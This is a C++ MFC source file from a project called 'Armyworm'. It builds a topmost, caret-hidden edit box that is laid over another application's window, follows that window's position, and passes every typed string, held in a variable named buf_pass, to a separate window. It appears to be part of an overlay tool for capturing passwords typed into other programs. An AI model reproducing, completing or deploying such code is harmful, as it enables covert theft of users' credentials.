// MYEDIT.cpp : 实现文件
// Code By Drizzle.Risk

#include "stdafx.h"
#include "Armyworm.h"
#include "MYEDIT.h"
#include "afxdialogex.h"

HWND message_hwnd2;

// MYEDIT 对话框

IMPLEMENT_DYNAMIC(MYEDIT, CDialogEx)

MYEDIT::MYEDIT(CWnd* pParent /*=NULL*/)
	: CDialogEx(MYEDIT::IDD, pParent)
{

	num = 0;
}

MYEDIT::~MYEDIT()
{
}

void MYEDIT::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_EDIT1, m_edit);
}


BEGIN_MESSAGE_MAP(MYEDIT, CDialogEx)
	ON_WM_TIMER()
	ON_WM_CTLCOLOR()
	ON_EN_CHANGE(IDC_EDIT1, &MYEDIT::OnEnChangeEdit1)
END_MESSAGE_MAP()


// MYEDIT 消息处理程序


BOOL MYEDIT::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	message_hwnd2 = this->message_hwnd;
	::SetParent(this->m_hWnd , parent);	//设置父句柄
	//置顶
	RECT rect;
	::GetWindowRect(this->hwnd , &rect);
	SetWindowPos(&CWnd::wndTopMost,rect.left,rect.top,rect.right-rect.left,rect.bottom-rect.top,SWP_NOMOVE|SWP_NOSIZE);
	::MoveWindow(this->hwnd, rect.left, rect.top, this->lwidth, this->lheight, 1);
	//属性
	((CEdit *)GetDlgItem(IDC_EDIT1))->HideCaret();

	this->m_edit.UpdateWindow();
	this->SetTimer(1,10,NULL);
	return TRUE; 
}
void MYEDIT::OnTimer(UINT nIDEvent) 
{
		//跟踪位置
		RECT rect , rect2;
		POINT point;
		::GetWindowRect(this->hwnd , &rect);
		point.x = rect.left;
		point.y = rect.top;
		//转换相对坐标
		::ScreenToClient(parent ,&point);
		::MoveWindow(this->m_hWnd,point.x,point.y,rect.right-rect.left,rect.bottom-rect.top,TRUE);
		rect2.left = point.x;
		rect2.top = point.y;
		rect2.right = rect.right-rect.left +  point.x;
		rect2.bottom = rect.bottom-rect.top + point.y;

		this->UpdateData(TRUE);
		this->m_edit.UpdateData(TRUE);
		::RedrawWindow(parent,&rect2,NULL,RDW_INVALIDATE|RDW_FRAME|RDW_UPDATENOW|RDW_ERASENOW|RDW_ALLCHILDREN);	//完美
		CDialog::OnTimer(nIDEvent);

}

HBRUSH MYEDIT::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	HBRUSH hbr = CDialogEx::OnCtlColor(pDC, pWnd, nCtlColor);

	return hbr;
}


void MYEDIT::OnEnChangeEdit1()
{
		//获取字符串，并且发送
		CString buf;
		CString buf_pass;
		CString buf_num;
		//this->m_hWnd;
		buf_num.Format("%d" , this->num);
		//buf_num.Format("%d", this->m_hWnd);
		this->m_edit.GetWindowTextA(buf_pass);
		buf = buf_num;
		buf += "\r\n";
		buf += buf_pass;
		this->hwnd;
		::SendMessage(message_hwnd2,WM_SETTEXT,0,(LPARAM)(char *)(buf.GetBuffer(buf.GetLength())));
}